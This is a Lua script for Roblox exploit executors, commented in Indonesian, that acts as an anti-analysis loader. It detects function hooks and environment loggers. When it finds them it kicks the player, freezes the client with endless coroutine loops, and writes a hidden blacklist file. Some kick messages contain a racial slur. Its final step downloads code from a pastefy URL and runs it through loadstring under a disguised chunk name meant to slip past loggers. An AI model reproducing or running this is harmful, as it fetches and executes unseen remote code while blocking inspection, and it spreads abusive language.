-- ==========================================
-- SILENT ANTI-HOOK / ANTI-TAMPER DETECTOR 
-- DENGAN SISTEM BLACKLIST & CUSTOM STRIKE MESSAGES
-- ==========================================

local BlacklistFile = ".sys/config/VNCITREKANWOZNAO.dat"

-- Membuat direktori yang "susah ditemukan"
local function SetupHiddenDirectory()
    pcall(function()
        if type(isfolder) == "function" and type(makefolder) == "function" then
            if not isfolder(".sys") then makefolder(".sys") end
            if not isfolder(".sys/config") then makefolder(".sys/config") end
        end
    end)
end

-- Membaca data blacklist (Format: Strikes|ExpiryTime)
local function GetBlacklistData()
    local data = {strikes = 0, expiry = 0}
    pcall(function()
        if type(isfile) == "function" and isfile(BlacklistFile) then
            local content = readfile(BlacklistFile)
            local parts = string.split(content, "|")
            data.strikes = tonumber(parts[1]) or 0
            data.expiry = tonumber(parts[2]) or 0
        end
    end)
    return data
end

-- Menyimpan data blacklist
local function SaveBlacklistData(strikes, expiry)
    pcall(function()
        SetupHiddenDirectory()
        if type(writefile) == "function" then
            writefile(BlacklistFile, tostring(strikes) .. "|" .. tostring(expiry))
        end
    end)
end

local function FreezeClient()
    task.spawn(function()
        while true do
            coroutine.resume(coroutine.create(function() while true do end end))
        end
    end)
end

local function ExecuteKick(msg)
    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        if player then player:Kick(msg) end
    end)
    pcall(function() task.wait(3) end)
    pcall(function() if type(game.Shutdown) == "function" then game:Shutdown() end end)
    pcall(function() task.wait(1) game:Destroy() end)
    FreezeClient()
end

-- ==========================================
-- CEK BLACKLIST SAAT SCRIPT BARU JALAN
-- ==========================================
local function VerifyStartupBlacklist()
    local data = GetBlacklistData()
    local currentTime = os.time()
    
    if data.expiry > 0 then
        if currentTime < data.expiry then
            -- Masih diblacklist
            local remainingDays = math.ceil((data.expiry - currentTime) / 86400)
            ExecuteKick("U GOT BLACKLISTED FOR " .. remainingDays .. " DAY")
        else
            -- Masa blacklist habis, reset strike jadi 0
            SaveBlacklistData(0, 0)
        end
    end
end

-- Jalankan verifikasi pertama
VerifyStartupBlacklist()

-- ==========================================
-- SISTEM HUKUMAN (PUNISH) & STRIKE
-- ==========================================
local function Punish(severityLevel)
    local data = GetBlacklistData()
    data.strikes = data.strikes + 1
    
    if data.strikes >= 3 then
        -- Strike 3: Aktifkan blacklist
        local blacklistDays = (severityLevel == 3) and 7 or 1
        data.expiry = os.time() + (blacklistDays * 86400)
        SaveBlacklistData(data.strikes, data.expiry)
        
        ExecuteKick("U GOT BLACKLISTED FOR " .. blacklistDays .. " DAY NIGGA")
    elseif data.strikes == 2 then
        -- Strike 2: Pesan custom
        SaveBlacklistData(data.strikes, 0)
        ExecuteKick("SON😂😭🙏")
    else
        -- Strike 1: Peringatan awal
        SaveBlacklistData(data.strikes, 0)
        ExecuteKick("SKID😂 (Strike 1/3)")
    end
end

-- ==========================================
-- LOGIC DETEKSI ANTI-HOOK
-- ==========================================
local function CheckForHooks()
    local hookDetected = false
    local metaDetected = false
    local envDetected = false

    -- Cek 1: Hooking Fungsi Dasar
    if type(isfunctionhooked) == "function" then
        local coreFunctions = { loadstring, require }
        if Instance and Instance.new then table.insert(coreFunctions, Instance.new) end
        if request then table.insert(coreFunctions, request) end
        
        for _, func in ipairs(coreFunctions) do
            pcall(function()
                if type(func) == "function" and isfunctionhooked(func) then
                    hookDetected = true
                end
            end)
        end
    end

    -- Cek 2: Manipulasi Metamethod
    if type(getrawmetatable) == "function" then
        pcall(function()
            local mt = getrawmetatable(game)
            if type(isfunctionhooked) == "function" then
                if mt.__index and isfunctionhooked(mt.__index) then metaDetected = true end
                if mt.__namecall and isfunctionhooked(mt.__namecall) then metaDetected = true end
                if mt.__newindex and isfunctionhooked(mt.__newindex) then metaDetected = true end
            end
        end)
    end

    -- Cek 3: Environment Logger Tracker
    pcall(function()
        if getgenv then
            local genv = getgenv()
            if genv.Track or (type(genv.log) == "function" and type(genv.formatlog) == "function") then
                envDetected = true
            end
        end
        if type(isfunctionhooked) == "function" then
            if type(getfenv) == "function" and isfunctionhooked(getfenv) then envDetected = true end
            if type(setfenv) == "function" and isfunctionhooked(setfenv) then envDetected = true end
        end
    end)

    -- Kalkulasi seberapa parah serangannya
    local severityLevel = 0
    if hookDetected then severityLevel = severityLevel + 1 end
    if metaDetected then severityLevel = severityLevel + 1 end
    if envDetected then severityLevel = severityLevel + 1 end

    -- Jika ada salah satu yang terdeteksi, eksekusi hukuman
    if severityLevel > 0 then
        Punish(severityLevel)
    end
end

-- Jalankan pengecekan hook
CheckForHooks()

coroutine.wrap(function()
    while task.wait(3) do
        CheckForHooks()
    end
end)()

-- ==========================================
-- EKSEKUSI PAYLOAD
-- ==========================================

local Payload_Script = [[
    local exc = loadstring
    local url = "https://pastefy.app/y9LITGEF/raw"
    exc(game:HttpGet(url))()
]]

-- Bypass string name (Bypass logger)
local ExecuteStealth = loadstring(Payload_Script, "windui_internal_core")

if ExecuteStealth then
    pcall(ExecuteStealth)
end
